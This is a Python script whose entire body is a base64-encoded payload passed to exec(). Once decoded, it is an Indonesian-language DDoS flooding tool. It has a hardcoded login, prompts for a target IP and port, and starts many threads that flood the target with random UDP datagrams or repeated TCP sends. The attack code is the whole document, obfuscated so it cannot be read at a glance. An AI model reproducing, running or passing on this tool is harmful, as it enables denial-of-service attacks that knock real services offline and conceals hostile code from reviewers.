import base64
exec(base64.b64decode("IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMwojUkVNQUtFIEJZIFhyaWFuCiNUT09MUyBCVUlMRCAyNi8xMC8yMDIxCiNWMwppbXBvcnQgcmFuZG9tCmltcG9ydCBzb2NrZXQKaW1wb3J0IHRocmVhZGluZwppbXBvcnQgc3lzCmltcG9ydCBvcwppbXBvcnQgc2lnbmFsCmltcG9ydCB0aW1lCmZyb20gb3MgaW1wb3J0IHN5c3RlbSwgbmFtZQoKb3Muc3lzdGVtKCJjbGVhciIpCnByaW50KCIiIgpcMDMzWzkxbSAK4paI4paI4paI4paI4paI4paI4pWX4paR4paI4paI4pWX4paR4paI4paI4paI4paI4paI4pWX4paR4paI4paI4paI4pWX4paR4paR4paI4paI4pWXCuKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVl+KWiOKWiOKVkeKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVl+KWiOKWiOKWiOKWiOKVl+KWkeKWiOKWiOKVkQrilojilojilojilojilojilojilZTilZ3ilojilojilZHilojilojilojilojilojilojilojilZHilojilojilZTilojilojilZfilojilojilZEK4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4paI4paI4pWR4paI4paI4pWU4pWQ4pWQ4paI4paI4pWR4paI4paI4pWR4pWa4paI4paI4paI4paI4pWRCuKWiOKWiOKVkeKWkeKWkeKWiOKWiOKVkeKWiOKWiOKVkeKWiOKWiOKVkeKWkeKWkeKWiOKWiOKVkeKWiOKWiOKVkeKWkeKVmuKWiOKWiOKWiOKVkQrilZrilZDilZ3ilpHilpHilZrilZDilZ3ilZrilZDilZ3ilZrilZDilZ3ilpHilpHilZrilZDilZ3ilZrilZDilZ3ilpHilpHilZrilZDilZDilZ0KIiIiKQoKI0xvZ2luCgp1c2VyID0iWHJpYW5YIgoKZm9yIGkgaW4gcmFuZ2UoMyk6Cglwd2QgPSBpbnB1dCgiXDAzM1s5M20+IE1hc3VrYW4gVXNlciA6ICIpCglqPTMKCWlmKHB3ZD09dXNlcik6CgkJdGltZS5zbGVlcCg1KQoJCWJyZWFrCgllbHNlOgoJCXRpbWUuc2xlZXAoNSkKCQlwcmludCgiXDAzM1s5MW0+IFVzZXIgTnlhIFNhbGFoIikKCQljb250aW51ZQp0aW1lLnNsZWVwKDUpCnByaW50KCJcMDMzWzk0bT4gTmFoIEJlbmVyIikKCnBhc3N3b3JkID0iU3lnIEthbXUiCgpmb3IgaSBpbiByYW5nZSgzKToKCXB3ZCA9IGlucHV0KCJcMDMzWzkzbT4gTWFzdWthbiBQYXNzd29yZCA6ICIpCglqPTMKCWlmKHB3ZD09cGFzc3dvcmQpOgoJCXRpbWUuc2xlZXAoNSkKCQlwcmludCgiXDAzM1s5Mm1CZXJhayBEdWx1IE9tIikKCQlicmVhawoJZWxzZToKCQl0aW1lLnNsZWVwKDUpCgkJcHJpbnQoIlwwMzNbOTFtPiBQYXNzd29yZCBTYWxhaCIpCgkJY29udGludWUKdGltZS5zbGVlcCg1KQpwcmludCgiXDAzM1s5NG0+IFBhc3N3b3JkIEJlbmFyIikKCiMgU2NyaXB0CgoKb3Muc3lzdGVtKCJjbGVhciIpCnByaW50KCIiIgpcMDMzWzkxbQoK4paI4paI4paI4paI4paI4paI4pWX4paR4paI4paI4paI4paI4paI4paI4pWX4paR4paR4paI4paI4paI4paI4paI4pWX4paR4paR4paI4paI4paI4paI4paI4paI4pWXCuKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVl+KWiOKWiOKVlOKVkOKVkOKWiOKWiOKVl+KWiOKWiOKVlOKVkOKVkOKWiOKWiOKVl+KWiOKWiOKVlOKVkOKVkOKVkOKVkOKVnQrilojilojilZHilpHilpHilojilojilZHilojilojilZHilpHilpHilojilojilZHilojilojilZHilpHilpHilojilojilZHilZrilojilojilojilojilojilZfilpEK4paI4paI4pWR4paR4paR4paI4paI4pWR4paI4paI4pWR4paR4paR4paI4paI4pWR4paI4paI4pWR4paR4paR4paI4paI4pWR4paR4pWa4pWQ4pWQ4pWQ4paI4paI4pWXCuKWiOKWiOKWiOKWiOKWiOKWiOKVlOKVneKWiOKWiOKWiOKWiOKWiOKWiOKVlOKVneKVmuKWiOKWiOKWiOKWiOKWiOKVlOKVneKWiOKWiOKWiOKWiOKWiOKWiOKVlOKVnQrilZrilZDilZDilZDilZDilZDilZ3ilpHilZrilZDilZDilZDilZDilZDilZ3ilpHilpHilZrilZDilZDilZDilZDilZ3ilpHilZrilZDilZDilZDilZDilZDilZ3ilpEKIiIiKQppcCA9IHN0cihpbnB1dCgiIEhvc3QvSXA6IikpCnBvcnQgPSBpbnQoaW5wdXQoIiBQb3J0OiIpKQpjaG9pY2UgPSBzdHIoaW5wdXQoIiBZQUtFTiBERE9TPyh5L24pOiIpKQp0aW1lcyA9IGludChpbnB1dCgiIFBhY2tldHMgcGVyIG9uZSBjb25uZWN0aW9uOiIpKQp0aHJlYWRzID0gaW50KGlucHV0KCIgVGhyZWFkczoiKSkKZGVmIHJ1bigpOgoJZGF0YSA9IHJhbmRvbS5fdXJhbmRvbSgyMDAwKQoJaSA9IHJhbmRvbS5jaG9pY2UoKCJbKl0iLCJbIV0iLCJbI10iKSkKCXdoaWxlIFRydWU6CgkJdHJ5OgoJCQlzID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfREdSQU0pCgkJCWFkZHIgPSAoc3RyKGlwKSxpbnQocG9ydCkpCgkJCWZvciB4IGluIHJhbmdlKHRpbWVzKToKCQkJCXMuc2VuZHRvKGRhdGEsYWRkcikKCQkJcHJpbnQoaSArIiBYcmlhbiBBdHRhY2sgRnJvbSBTZXJ2ZXIhISEiKQoJCWV4Y2VwdDoKCQkJcHJpbnQoIlshXSBEb3duISEhIikKCmRlZiBydW4yKCk6CglkYXRhID0gcmFuZG9tLl91cmFuZG9tKDIwKQoJaSA9IHJhbmRvbS5jaG9pY2UoKCJbKl0iLCJbIV0iLCJbI10iKSkKCXdoaWxlIFRydWU6CgkJdHJ5OgoJCQlzID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfU1RSRUFNKQoJCQlzLmNvbm5lY3QoKGlwLHBvcnQpKQoJCQlzLnNlbmQoZGF0YSkKCQkJZm9yIHggaW4gcmFuZ2UodGltZXMpOgoJCQkJcy5zZW5kKGRhdGEpCgkJCXByaW50KGkgKyIgWHJpYW4gQXR0YWNrIEZyb20gU2VydmVyISEhIikKCQlleGNlcHQ6CgkJCXMuY2xvc2UoKQoJCQlwcmludCgiWypdIERvd24hISEiKQoKZm9yIHkgaW4gcmFuZ2UodGhyZWFkcyk6CglpZiBjaG9pY2UgPT0gJ3knOgoJCXRoID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQgPSBydW4pCgkJdGguc3RhcnQoKQoJZWxzZToKCQl0aCA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0ID0gcnVuMikKCQl0aC5zdGFydCgp"))